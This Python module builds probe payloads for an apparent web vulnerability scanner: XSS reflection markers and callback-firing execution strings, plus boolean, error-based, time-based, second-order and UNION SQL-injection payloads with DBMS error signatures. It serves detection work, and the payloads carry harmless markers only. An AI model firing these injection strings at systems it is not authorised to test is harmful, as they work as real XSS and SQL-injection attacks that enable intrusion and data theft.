"""
XSS payloads.

Detection uses a reflection marker: a unique token wrapped in raw HTML special
chars. If it comes back un-escaped (the angle brackets survive), the parameter
reflects into HTML without encoding — a candidate.

Verification uses execution payloads that call a JS binding we expose on the page
(window.__psxss). If the binding fires with our token, the injection actually ran
in the browser — confirmed. Payloads are harmless: they only call our callback,
never alert()/navigation/network, and cover the common HTML-body, attribute-
breakout, and script-string contexts.
"""

XSS_MARKER_PREFIX = "psx"
EXEC_BINDING = "__psxss"


def xss_marker_payload(token: str) -> str:
    """Reflection probe: unique token + raw special chars."""
    return f'{XSS_MARKER_PREFIX}{token}<svg/onload=1>"\''


def xss_marker_signal(token: str) -> str:
    """The un-escaped substring we look for in the response body."""
    return f"{XSS_MARKER_PREFIX}{token}<svg/onload=1>"


# Stored XSS uses its own prefix so a stored marker is never confused with a
# reflected one, and so we can map a sink hit back to the injection that seeded it.
STORED_MARKER_PREFIX = "pstx"


def stored_marker_payload(token: str) -> str:
    """Stored-XSS reflection probe: a distinct token + raw special chars."""
    return f'{STORED_MARKER_PREFIX}{token}<svg/onload=1>"\''


def stored_marker_signal(token: str) -> str:
    """The un-escaped substring that, if found on a DIFFERENT page, means it was stored."""
    return f"{STORED_MARKER_PREFIX}{token}<svg/onload=1>"


def sqli_boolean_pairs(value: str) -> list[tuple[str, str, str]]:
    """
    Boolean (blind) SQL-injection probe pairs across common query contexts.

    Each tuple is (context_label, true_payload, false_payload): two injections that
    are logically TRUE vs FALSE but otherwise identical. In a vulnerable query the
    database evaluates the condition, so the TRUE request behaves like the original
    (same rows) while the FALSE request suppresses them — a response difference the
    detector can see. In a safe (parameterised) query both are treated as literal
    text, so the two responses are identical and nothing is raised.

    The original benign value is kept as a prefix so we stay inside whatever
    clause the parameter normally lands in before adding the condition.
    """
    v = value if value not in (None, "") else "1"
    return [
        # value is used numerically: ... WHERE id = 1 AND 1=1
        ("numeric", f"{v} AND 1=1", f"{v} AND 1=2"),
        # value is inside a single-quoted string: ... WHERE name = '1' AND '1'='1'
        ("single-quote", f"{v}' AND '1'='1", f"{v}' AND '1'='2"),
        # single-quoted string, terminated with a comment: ... = '1' AND 1=1-- -
        ("single-quote-comment", f"{v}' AND 1=1-- -", f"{v}' AND 1=2-- -"),
        # value inside a parenthesised single-quoted clause: ... IN ('1') ...
        ("paren-single-quote", f"{v}') AND ('1'='1", f"{v}') AND ('1'='2"),
        # double-quoted string context
        ('double-quote', f'{v}" AND "1"="1', f'{v}" AND "1"="2'),
    ]


def sqli_error_payloads(value: str) -> list[tuple[str, str]]:
    """
    Syntax-breaking probes for error-based SQLi: a lone quote/paren/backslash that,
    if concatenated into a query, makes the SQL unparsable. A *database* error
    surfacing in the response means the input reached the SQL engine verbatim.

    Each tuple is (label, breaking_payload).
    """
    v = value if value not in (None, "") else "1"
    return [
        ("single-quote", f"{v}'"),
        ("double-quote", f'{v}"'),
        ("paren-quote", f"{v}')"),
        ("backslash", f"{v}\\"),
    ]


# Lower-cased fragments of real DBMS error messages. A match that is NOT already in
# the untouched response is strong evidence the input broke a SQL statement.
SQL_ERROR_SIGNATURES = [
    # SQLite
    "sqlite3.", "unrecognized token", "sqlite error", "no such column",
    "incomplete input", "unterminated",
    # MySQL / MariaDB
    "you have an error in your sql syntax", "warning: mysql", "mysql_fetch",
    "mysqli", "check the manual that corresponds to your",
    # PostgreSQL
    "syntax error at or near", "unterminated quoted string", "pg::", "pg_query",
    # MS SQL Server
    "unclosed quotation mark", "microsoft odbc", "microsoft ole db",
    "microsoft sql server", "incorrect syntax near",
    # Oracle
    "ora-0", "quoted string not properly terminated",
    # generic
    "sqlexception", "sqlstate", "odbc driver", "syntax error",
]


def sqli_time_payloads(value: str, delay: int) -> list[tuple[str, str]]:
    """
    Blind time-based probes across dialects: a conditional sleep of `delay` seconds.
    A response that is slow by ~delay only when the sleep is injected means the DB
    executed it. Each tuple is (label, payload).
    """
    v = value if value not in (None, "") else "1"
    d = int(delay)
    return [
        ("mysql-numeric", f"{v} AND SLEEP({d})"),
        ("mysql-quote", f"{v}' AND SLEEP({d})-- -"),
        ("postgres", f"{v} AND (SELECT 1 FROM pg_sleep({d}))"),
        ("postgres-quote", f"{v}' AND (SELECT 1 FROM pg_sleep({d}))-- -"),
        ("mssql", f"{v}; WAITFOR DELAY '0:0:{d}'-- -"),
    ]


# Second-order (stored) SQLi: a unique marker plus a lone quote. The marker lets us
# correlate a seed with the page where it later surfaces; the quote breaks any query
# that concatenates the stored value, so a DB error on a *different* page proves the
# value flowed into SQL at a later use (second-order injection).
SECOND_ORDER_SQLI_PREFIX = "pssqli"


def stored_sqli_payload(token: str) -> str:
    return f"{SECOND_ORDER_SQLI_PREFIX}{token}'"


def stored_sqli_signal(token: str) -> str:
    """The marker (without the quote) to look for on a sink page."""
    return f"{SECOND_ORDER_SQLI_PREFIX}{token}"


def sqli_union_payloads(value: str, token: str, max_cols: int = 6) -> list[tuple[str, str, str]]:
    """
    UNION-based exfiltration probes. Each tuple is (label, payload, expected_marker).

    The marker is split and re-joined by the *database* (string concatenation), so the
    joined token never appears in the request — if it appears in the response, the DB
    executed our UNION SELECT and returned attacker-chosen data (proof of exfiltration).
    Covers numeric/quoted contexts, the common concat operators, and a range of column
    counts (a UNION must match the original SELECT's column count).
    """
    v = value if value not in (None, "") else "1"
    half = max(1, len(token) // 2)
    h1, h2 = token[:half], token[half:] or token
    expected = h1 + h2
    concats = [
        ("pipe", f"'{h1}'||'{h2}'"),          # SQLite / PostgreSQL / Oracle
        ("concat", f"CONCAT('{h1}','{h2}')"),  # MySQL
        ("plus", f"'{h1}'+'{h2}'"),            # MS SQL Server
    ]
    out: list[tuple[str, str, str]] = []
    for cols in range(1, max_cols + 1):
        for cname, expr in concats:
            select_list = ",".join([expr] + ["NULL"] * (cols - 1))
            # numeric context, then single-quoted string context (both comment-terminated)
            out.append((f"numeric-{cname}-{cols}col",
                        f"{v} UNION SELECT {select_list}-- -", expected))
            out.append((f"quote-{cname}-{cols}col",
                        f"{v}' UNION SELECT {select_list}-- -", expected))
    return out


def xss_exec_payloads(token: str) -> list[str]:
    """Execution probes for the browser verifier, across common contexts."""
    cb = f"window.{EXEC_BINDING}"
    return [
        f'<script>{cb}("{token}")</script>',               # HTML body — runs on parse (no network, most reliable)
        f'<svg onload={cb}("{token}")>',                   # HTML body — runs on parse
        f'<img src=x onerror={cb}("{token}")>',            # HTML body — runs after the image fails to load
        f'"><script>{cb}("{token}")</script>',             # break out of a double-quoted attribute
        f"'><script>{cb}(\"{token}\")</script>",           # break out of a single-quoted attribute
        f'"><img src=x onerror={cb}("{token}")>',          # attribute breakout (network)
        f'</script><script>{cb}("{token}")</script>',      # break out of a <script> block
        f'";{cb}("{token}");//',                           # inside a double-quoted JS string
        f"';{cb}(\"{token}\");//",                         # inside a single-quoted JS string
    ]
